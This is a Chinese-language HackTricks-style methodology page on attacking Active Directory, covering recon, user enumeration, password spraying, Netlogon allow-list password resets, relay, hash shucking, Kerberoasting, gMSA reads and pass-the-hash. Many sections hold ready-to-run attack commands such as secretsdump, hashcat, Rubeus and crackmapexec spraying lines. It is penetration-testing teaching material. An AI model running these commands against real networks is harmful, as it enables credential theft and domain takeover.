# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使**网络管理员**能够在网络中高效地创建和管理**域**、**用户**和**对象**。它经过专门设计，能够扩展规模，便于将大量用户组织成易于管理的**组**和**子组**，并在不同层级控制**访问权限**。

**Active Directory** 的结构由三个主要层级组成：**域**、**树**和**林**。**域**包含一组共享同一数据库的对象，例如**用户**或**设备**。**树**是通过共享结构连接起来的一组域；**林**则由多个树组成，这些树通过**信任关系**相互连接，构成组织结构的最高层级。每个层级都可以指定特定的**访问**和**通信权限**。

**Active Directory** 中的关键概念包括：

1. **目录** – 存储与 Active Directory 对象相关的所有信息。
2. **对象** – 指目录中的实体，包括**用户**、**组**或**共享文件夹**。
3. **域** – 作为目录对象的容器；一个**林**中可以有多个域，每个域都维护自己的对象集合。
4. **树** – 共享同一根域的一组域。
5. **林** – Active Directory 组织结构的最高层级，由多个树组成，它们之间存在**信任关系**。

**Active Directory Domain Services (AD DS)** 包含一系列对网络中的集中管理和通信至关重要的服务，包括：

1. **域服务** – 集中存储数据，并管理**用户**与**域**之间的交互，包括**身份验证**和**搜索**功能。
2. **证书服务** – 负责安全**数字证书**的创建、分发和管理。
3. **轻型目录服务** – 通过 **LDAP 协议**支持启用了目录功能的应用程序。
4. **目录联合服务** – 提供**单点登录**功能，使用户能够在一个会话中通过身份验证访问多个 Web 应用程序。
5. **权限管理** – 通过管控受版权保护材料的未授权分发和使用，帮助保护这些材料。
6. **DNS 服务** – 对**域名**解析至关重要。

如需更详细的说明，请参阅：[**TechTerms - Active Directory 定义**](https://techterms.com/definition/active_directory)

### **Kerberos 身份验证**

要学习如何**攻击 AD**，你需要充分**了解** **Kerberos 身份验证流程**。\
[**如果你还不了解它的工作原理，请阅读此页面。**](kerberos-authentication.md)

## 速查表

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io)，快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos 通信通常**需要完全限定域名 (FQDN)**，以便客户端获取正确 SPN 的票据。通过 IP 地址访问机器时，通常会回退到 NTLM，而不是 Kerberos。

## Active Directory 侦察（无凭据/会话）

如果你只能访问 AD 环境，但没有任何凭据/会话，可以尝试：

- **对网络进行 Pentest：**
  - 扫描网络，发现机器和开放端口，并尝试**利用漏洞**或从中**提取凭据**（例如，[打印机可能是非常有意思的目标](ad-information-in-printers.md)）。
  - 枚举 DNS 可能会发现域中的关键服务器信息，例如 Web、打印机、共享、VPN、媒体服务器等。
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)，了解更多相关信息。
- **检查 SMB 服务是否允许 null 和 Guest 访问**（这在现代 Windows 版本上不起作用）：
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - 此处提供了更详细的 SMB 服务器枚举指南：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **枚举 LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - 此处提供了更详细的 LDAP 枚举指南（请**特别关注匿名访问**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **投毒网络**
  - 通过 [**使用 Responder 冒充服务**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)收集凭据
  - 通过[**滥用 relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)访问主机
  - 通过**暴露**[**使用 evil-S 提供的虚假 UPnP 服务**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)收集凭据
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html)：
  - 从内部文档、社交媒体、域环境中的服务（主要是 Web 服务）以及公开可用的信息中提取用户名/姓名。
  - 如果你找到公司员工的全名，可以尝试不同的 AD **用户名命名规则（**[**阅读此处**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的规则有：_NameSurname_、_Name.Surname_、_NamSur_（每个姓名取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个_随机字母加 3 个随机数字_（abc123）。
  - 工具：
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **匿名 SMB/LDAP 枚举：**查看[**SMB pentesting**](../../network-services-pentesting/pentesting-smb/index.html)和[**LDAP pentesting**](../../network-services-pentesting/pentesting-ldap.md)页面。
- **Kerbrute 枚举**：当服务器收到**无效用户名请求**时，会返回 **Kerberos 错误码** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_，据此可以判断用户名无效。对于**有效用户名**，服务器会返回包含 **TGT 的 AS-REP**，或返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示用户需要执行预身份验证。
- **针对 MS-NRPC 的无身份验证：**在域控制器上使用 auth-level = 1（无身份验证）访问 MS-NRPC (Netlogon) 接口。此方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以检查用户或计算机是否存在，无需任何凭据。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现了此类枚举。相关研究可见[此处](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) 服务器**

如果你在网络中发现了这类服务器，也可以对其进行**用户枚举**。例如，可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper)：

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> 你可以在[**这个 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)和另一个 repo（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）中找到用户名列表。
>
> 不过，你应该已经在此前执行的 recon 步骤中收集了**公司员工的姓名**。有了名字和姓氏，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 生成可能有效的用户名。

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

即使 DC 已修补 **Zerologon**，显式列入允许名单的账户仍可能受到**旧版/易受攻击的 Netlogon secure-channel 行为**影响。存在风险的配置是 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** 或对应的注册表值 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**。

该值是一个 **SDDL security descriptor**（参见 [Security Descriptors](security-descriptors.md)）。在 DACL 中被授予相关 ACE 的任何账户或组都可能成为攻击目标。例如，`O:BAG:BAD:(A;;RC;;;WD)` 实际上会将 **Everyone** 列入允许名单。

实际操作流程：

1. 检查 **SYSVOL/GPO** 和 **DC 的实时注册表**，**识别列入允许名单的主体**。
2. 将 SDDL 中的 SID **解析为实际的 AD 用户/计算机**，并优先关注 **DC machine accounts**、**trust accounts** 和其他特权计算机。
3. 反复尝试以列入允许名单的账户进行 **MS-NRPC / Netlogon authentication**。
4. 猜测成功后，滥用 **Netlogon password-setting** 重置目标账户的密码（公开的 PoC 会将其设为空字符串）。<sup>[[9]](#references)[[10]](#references)</sup>

公开 artifact 中的快速排查 / lab 示例：

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

备注：

- **scanner** 很有用，因为有效的 allow-list 可能位于 **SYSVOL**、**registry** 中，或两者都有。
- exploit path 本身很重要，因为一旦识别出存在漏洞的账户，**就不需要 Domain Admin 权限**。
- 入侵 **Domain Controller 机器账户**（例如 `DC$`）尤其危险，因为重置该密码可以直接开启更广泛的 **AD takeover** 路径。
- **Brute-force 是否可行**取决于模式：公开资料描述了 meet-in-the-middle 方法、在有另一个计算机账户可用时进行 **24-bit** brute force，以及速度较慢的 **32-bit** 变体。

检测 / 加固备注：

- 审核 allow-list 策略，删除所有内容，仅保留临时且明确要求的兼容性例外。
- 监控 DC **System** 事件 **5827/5828/5829/5830/5831**，以发现易受攻击的 Netlogon 连接遭到拒绝、被发现或根据策略明确允许的情况。
- 在移除旧版依赖之前，将 `VulnerableChannelAllowList` 中的账户视为**高风险**。

### 已知一个或多个用户名

好，你已经知道一个有效用户名，但没有密码……那么试试：

- [**ASREPRoast**](asreproast.md)：如果用户**没有**属性 _DONT_REQ_PREAUTH_，你可以为该用户**请求 AS_REP 消息**，其中会包含一些由该用户密码的派生值加密的数据。
- [**Password Spraying**](password-spraying.md)：试着对发现的每个用户使用最**常见的密码**，也许有用户设置了弱密码（请记住密码策略！）。
  - 请注意，你还可以对 **OWA servers** 进行 **spray**，尝试访问用户的邮件服务器。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你或许可以通过对**网络**中的某些协议进行 **poisoning**，来**获取**一些可用于破解的 **hashes**：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory 枚举可提供用户名、电子邮件标识符和命名模式、候选主机，以及可能被诱导进行身份验证的服务。利用这些信息识别可行的 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 和进入 AD 环境的潜在路径。

### 基于 NetExec workspace 的侦察与 relay 状态检查

- 使用 **`nxcdb` workspaces** 按 engagement 保存 AD 侦察状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下创建各协议的 SQLite DB（smb/mssql/winrm/ldap 等）。使用 `proto smb|mssql|winrm` 切换视图，并通过 `creds` 列出收集到的 secrets。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- 使用 **`netexec smb <cidr>`** 快速发现子网，可获取 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth** 信息。显示 `(signing:False)` 的成员主机容易遭受 **relay** 攻击，而 DC 通常要求启用 signing。
- 直接根据 NetExec 输出在 /etc/hosts 中生成**主机名**，以便于目标定位：

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- 当 **SMB relay to the DC 被** signing **阻止**时，仍应探测 **LDAP** 的安全状况：`netexec ldap <dc>` 会突出显示 `(signing:None)` / 弱 channel binding。即使 DC 要求 SMB signing，但禁用了 LDAP signing，它仍是可用于 **relay-to-LDAP** 攻击的目标，例如滥用 **SPN-less RBCD**。

### 客户端打印机凭据 leaks → 批量验证域凭据

- 打印机/Web UI 有时会在 HTML 中**嵌入被遮掩的管理员密码**。查看源代码/开发者工具可能会发现明文（例如 `<input value="<password>">`），从而通过 Basic-auth 访问扫描/打印存储库。
- 检索到的打印作业可能包含**明文入职文档**，其中有每位用户的密码。测试时要确保配对关系对应：<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### 窃取 NTLM 凭据

如果你可以使用 **null 或 guest 用户访问其他 PC 或共享资源**，就可以**放置文件**（例如 SCF 文件）。如果这些文件以某种方式被访问，就会**触发针对你的 NTLM 身份验证**，让你可以**窃取** **NTLM challenge** 并尝试破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking 与 NT-Candidate 攻击

**Hash shucking** 会将你已拥有的每个 NT hash 视为其他较慢格式的候选密码，这些格式的密钥材料直接从 NT hash 派生。与其对 Kerberos RC4 tickets、NetNTLM challenges 或缓存凭据进行长密码短语的暴力破解，不如将 NT hash 输入 Hashcat 的 NT-candidate 模式，让它验证密码是否重复使用，而无需获知明文。域遭到入侵后，这种方法尤其有效，因为你可以收集数千个当前和历史 NT hash。<sup>[[5]](#references)</sup>

适合使用 shucking 的情况：

- 你从 DCSync、SAM/SECURITY dumps 或 credential vaults 获取了 NT hash 集合，需要检测其他域/森林中是否重复使用这些密码。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM responses 或 DCC/DCC2 blobs。
- 你想快速确认无法破解的长密码短语是否被重复使用，并立即通过 Pass-the-Hash 横向转移。

此技术**不适用于**密钥并非 NT hash 的加密类型（例如 Kerberos etype 17/18 AES）。如果域强制使用 AES，则必须改用常规密码模式。

#### 构建 NT hash 集合

- **DCSync/NTDS** – 使用 `secretsdump.py` 并包含历史记录，以获取尽可能多的 NT hash（及其先前值）：

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  历史条目会大幅扩大候选池，因为 Microsoft 最多可为每个账户存储 24 个旧哈希。要了解更多提取 NTDS secrets 的方法，请参阅：

{{#ref}}
dcsync.md
{{#endref}}

- **端点缓存转储** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）可提取本地 SAM/SECURITY 数据和缓存的域登录凭据（DCC/DCC2）。去重后，将这些哈希追加到同一个 `nt_candidates.txt` 列表中。
- **跟踪元数据** – 记录每个哈希对应的用户名/域（即使字典中只包含十六进制值）。匹配的哈希能让你在 Hashcat 显示破解出的候选密码后，立即知道哪个主体重复使用了该密码。
- 优先使用来自同一 forest 或受信任 forest 的候选项；这样在 shucking 时，出现重叠的可能性最大。

#### Hashcat NT-candidate 模式

| 哈希类型                                  | 密码模式 | NT-candidate 模式 |
| ---------------------------------------- | ------------- | ----------------- |
| 域缓存凭据（DCC）          | 1100          | 31500             |
| 域缓存凭据 2（DCC2）       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP（Kerberoast） | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate 输入**必须保持为原始的 32 位十六进制 NT 哈希**。请禁用规则引擎（不要使用 `-r`，也不要使用混合模式），因为变换会破坏候选密钥材料。
- 这些模式本身并不会更快，但 NTLM 密钥空间（在 M3 Max 上约为 30,000 MH/s）比 Kerberos RC4（约为 300 MH/s）快约 100 倍。测试经过筛选的 NT 列表，比在较慢的格式中探索整个密码空间成本低得多。
- 始终使用**最新的 Hashcat 构建版本**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是最近才加入的。<sup>[[7]](#references)</sup>
- 目前 AS-REQ Pre-Auth 没有对应的 NT 模式；AES etype（19600/19700）需要明文密码，因为其密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而不是直接使用原始 NT 哈希。

#### 示例 – Kerberoast RC4（模式 35300）

1. 使用低权限用户为目标 SPN 捕获 RC4 TGS（详情请参阅 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. 使用你的 NT 列表提取 ticket：

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat 会从每个 NT 候选值推导 RC4 密钥，并验证 `$krb5tgs$23$...` blob。匹配即确认该服务账户使用了你现有的某个 NT hash。

3. 立即通过 PtH 转向：

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   如有需要，之后可以使用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### 示例 – Cached credentials（模式 31600）

1. 从已攻陷的工作站 Dump 缓存的登录信息：

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 并对其进行 shuck：

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 匹配成功后，会得到列表中已知的 NT hash，这证明缓存用户重复使用了密码。可直接将其用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`），或使用快速 NTLM 模式进行暴力破解以恢复明文。

完全相同的工作流也适用于 NetNTLM challenge-response（`-m 27000/27100`）和 DCC（`-m 31500`）。识别出匹配项后，你可以启动 relay，使用 SMB/WMI/WinRM PtH，或离线使用掩码/规则重新破解 NT hash。



## 使用凭据/session 枚举 Active Directory

此阶段需要你**已攻陷有效域账号的凭据或 session**。如果你有有效凭据，或拥有域用户的 shell，**请记住，前面介绍的方法仍可用于攻陷其他用户**。

开始经过身份验证的枚举前，请先了解 **Kerberos double-hop 问题**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 枚举

攻陷一个账号是**评估域环境的重要一步**，因为它可以让你经过身份验证后进行 **Active Directory 枚举**：

关于 [**ASREPRoast**](asreproast.md)，你现在可以找出所有可能存在漏洞的用户；关于 [**Password Spraying**](password-spraying.md)，你可以获取**所有用户名列表**，并尝试使用被攻陷账号的密码、空密码以及新的潜在密码。

- 你可以使用 [**CMD 执行基础 recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell 进行 recon**](../basic-powershell-for-pentesters/index.html)，这种方式更加隐蔽
- 你还可以[**使用 powerview**](../basic-powershell-for-pentesters/powerview.md)提取更详细的信息
- Active Directory 中另一个出色的 recon 工具是 [**BloodHound**](bloodhound.md)。它**不太隐蔽**（取决于你使用的收集方法），但**如果你不介意**，完全可以试试。查找用户可以通过 RDP 访问的位置、通往其他组的路径等。
  - **其他自动化 AD 枚举工具包括：** [**AD Explorer**](bloodhound.md#ad-explorer)**、** [**ADRecon**](bloodhound.md#adrecon)**、** [**Group3r**](bloodhound.md#group3r)**、** [**PingCastle**](bloodhound.md#pingcastle)**。**
- 查看 [**AD 的 DNS 记录**](ad-dns-records.md)，其中可能包含有用的信息。
- 你可以使用 **SysInternal** Suite 中带 GUI 的工具 **AdExplorer.exe** 来枚举目录。
- 你还可以使用 **ldapsearch** 搜索 LDAP 数据库，在 _userPassword_ 和 _unixUserPassword_ 字段中查找凭据，也可以检查用户的 _description_ 和 _info_ 备注。_info_ 中未标明用途、但看起来像密码的字符串只能视为候选项：请另外确认其用途和有效性，并避免在常规枚举输出中记录备注内容。其他方法请参见 [PayloadsAllTheThings 上关于 AD 用户评论中密码的说明](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)。
- 在授权允许的情况下，检查 `\\<dc>\NETLOGON` 或 `\\<dc>\SYSVOL\<domain>\scripts` 下**可访问**的域登录脚本和驱动器映射脚本。[Microsoft 文档](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)介绍了 NETLOGON share 用于存放脚本目录的作用。先列出文件名，再在大小限制内检查相关且可读取的脚本；不要转储整个 share，也不要在常规枚举过程中回显凭据值。PowerShell 调用 [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **无法保护脚本中以字面形式存储的密码**。仅凭此调用并不能证明脚本中硬编码了秘密：请追踪它的实际输入，然后另外验证账号、凭据有效性和权限。检查域脚本属于远程 share 审查，与本地主机枚举是不同的工作。
- 如果你使用 **Linux**，还可以通过 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举域。
- 你也可以尝试以下自动化工具：
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

  在 Windows 上很容易获取所有域用户名（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 上，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 虽然本枚举部分看起来很短，但它是整个流程中最重要的部分。请访问相关链接（尤其是 CMD、powershell、powerview 和 BloodHound 的链接），学习如何枚举域，并不断练习，直到熟练掌握。在评估过程中，这是找到通往 DA 的路径，或判断无计可施的关键时刻。

### 可预测的预创建计算机账号 -> gMSA 密码访问

为兼容旧版加入域流程而预先创建的计算机账号，可能保留可预测的初始密码。NetExec 的 `pre2k` 模块会识别特征性的 `userAccountControl` 值 `4128`（`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`），并尝试使用小写计算机名的前 14 个字符（不含末尾的 `$`）获取 Kerberos TGT。应将此 UAC 值视为筛选候选项的依据；不要仅凭账号属于 **Pre-Windows 2000 Compatible Access** 就断定其密码较弱。<sup>[[18]](#references)[[20]](#references)</sup>

使用经过身份验证的 LDAP 枚举来测试候选项，并保存成功获取的 TGT。`ALL=True` 会将测试范围扩展至默认 `4128` 筛选条件之外的对象。<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

默认/NTLM 绑定失败**并不**意味着此发现无效：使用 `-k`、可解析到 DC 的 FQDN，以及与 KDC 同步的时钟进行测试。成功运行的模块会在 `~/.nxc/modules/pre2k/` 下写入候选列表和获取的 ccaches。<sup>[[18]](#references)[[20]](#references)</sup>

攻陷计算机主体后，梳理其嵌套组成员身份和出站权限。尤其是，列在 gMSA 的 `msDS-GroupMSAMembership` 安全描述符中的主体可以读取 `msDS-ManagedPassword`；NetExec 的 `--gmsa` 输出会显示获准的主体，并在进行身份验证的计算机获得授权时返回当前 NT 哈希。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

然后像评估其他凭据一样评估恢复的 gMSA：检查本地/域组成员身份、登录权限、SPN、委派以及可访问的服务，再尝试 pass-the-hash。此 ACL 检索路径不同于 [Golden gMSA/dMSA](golden-dmsa-gmsa.md)，后者是在 KDS root key 遭到入侵后推导托管密码。<sup>[[20]](#references)</sup>

计算机主体也可能对其他计算机对象或组拥有出站控制权。获取该主体后，应单独检查其嵌套成员身份和有效 ACL：对其他计算机对象的写入权限可能允许更改账户，而组成员身份权限可能带来登录角色。仅凭暂存账户标志、可预测的命名约定或 `GenericWrite` 关系，并不能证明完整攻击路径成立。

文件、共享或备份中存在可读取的 `msDS-ManagedPassword` blob 副本，是另一种独立的暴露途径：LDAP 读取 ACL 无法保护存储在其他位置的副本。解读前应确认数据确实是托管密码 blob，并将这种情况与经授权的 LDAP 读取以及 KDS root key 推导区分开来。

### Kerberoast

Kerberoasting 涉及获取服务所用的 **TGS tickets**（这些服务与用户账户绑定），并**离线**破解其加密——加密基于用户密码。

更多内容请参阅：


{{#ref}}
kerberoast.md
{{#endref}}

### 远程连接（RDP、SSH、FTP、Win-RM 等）

获取一些凭据后，可以检查是否能够访问任何**主机**。为此，可以根据端口扫描结果，使用 **CrackMapExec** 尝试通过不同协议连接多台服务器。

### 本地权限提升

如果你已攻陷凭据或获得普通域用户会话，并且可以访问域中的**任何主机**，就应寻找**在本地提升权限并收集凭据**的路径。本地管理员权限可能允许你从内存（LSASS）和本地存储（SAM）中**转储其他用户的哈希**。

本书中有完整页面介绍 [**Windows 本地权限提升**](../windows-local-privilege-escalation/index.html) 和一份[**检查清单**](../checklist-windows-privilege-escalation.md)。另外，别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### 当前会话票据

当前用户的 **tickets** 中**恰好授予你访问**意外资源的权限的情况**很少见**，但你可以检查：

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

有了域凭据或用户会话后，可以重新尝试 NTLM [**中继攻击**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)：已认证枚举和强制认证技术可以暴露在未认证侦察期间无法发现的中继路径。

### 在计算机共享中查找凭据 | SMB 共享

现在你已经有了一些基本凭据，应该检查能否在 AD 内部的共享中**找到**任何**有趣的文件**。你可以手动操作，但这会非常枯燥且重复（如果发现数百份需要检查的文档，就更是如此）。

[**点击此链接了解可以使用哪些工具。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### 窃取 NTLM 凭据

如果你可以**访问其他 PC 或共享**，就可以**放置文件**（例如 SCF 文件）。如果有人以某种方式访问这些文件，它们就会**触发针对你的 NTLM 身份验证**，让你能够**窃取**并破解 **NTLM challenge**：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何经过身份验证的用户**攻陷域控制器**。


{{#ref}}
printnightmare.md
{{#endref}}

## 使用特权凭据/会话进行 Active Directory 提权

**对于以下技术，普通域用户权限并不足够；你需要一些特殊权限/凭据才能实施这些攻击。**

### 哈希提取

希望你已经通过 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括中继）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[本地提权](../windows-local-privilege-escalation/index.html) 等方式**攻陷了某个本地管理员**账户。\
接下来就该转储内存和本地存储中的所有哈希了。\
[**阅读此页面，了解获取哈希的不同方法。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**拿到用户的哈希后**，你就可以用它来**冒充**该用户。\
你需要使用某种**工具**，通过该**哈希执行** **NTLM 身份验证**；**或者**，你可以创建一个新的 **sessionlogon**，并将该**哈希注入** **LSASS**，这样进行任何 **NTLM 身份验证**时都会使用该**哈希**。mimikatz 使用的是后一种方法。\
[**阅读此页面了解更多信息。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM 哈希请求 Kerberos 票据**，作为常见的通过 NTLM 协议进行 Pass The Hash 的替代方法。因此，在**禁用 NTLM 协议**、仅允许 **Kerberos** 作为身份验证协议的网络中，此方法尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击中，攻击者**窃取用户的身份验证票据**，而不是其密码或哈希值。随后，攻击者使用窃取的票据**冒充该用户**，未经授权访问网络中的资源和服务。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 凭据复用

如果你有本地管理员的**哈希**或**密码**，应该尝试用它**登录**其他 **PC**。

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> 注意，这种操作会产生相当多的 **噪声**，而 **LAPS** 可以缓解这一问题。

